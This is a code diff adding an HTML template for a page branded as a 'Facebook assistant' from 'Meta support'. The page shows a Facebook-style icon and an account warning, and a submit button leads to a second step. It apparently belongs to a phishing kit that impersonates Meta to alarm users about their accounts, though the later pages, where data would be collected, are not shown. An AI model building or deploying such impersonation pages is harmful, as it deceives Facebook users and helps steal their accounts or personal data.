@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="{{ lang.get('lang', 'en') }}">		
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>{{ lang['facebook_assistant'] }}</title>
+	<link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/1.css') }}">
+    <link rel="icon" href="{{ url_for('static', filename='images/mafbb.png') }}" type="image/webp">
+</head>
+<body>
+    <div class="main">
+        <div class="lop1">
+            <h1 class="h1">{{ lang['facebook_assistant'] }}</h1>
+            <h1 class="h2">{{ lang['meta_support'] }}</h1>
+            <img class="anh" src="{{ url_for('static', filename='images/anh1.webp') }}">
+
+            <p class="h3">{{ lang['account_warning'] }}</p>
+        </div>
+        <a href='/2' class="button">{{ lang['submit'] }}</a>
+    </div>
+</body>
+</html>
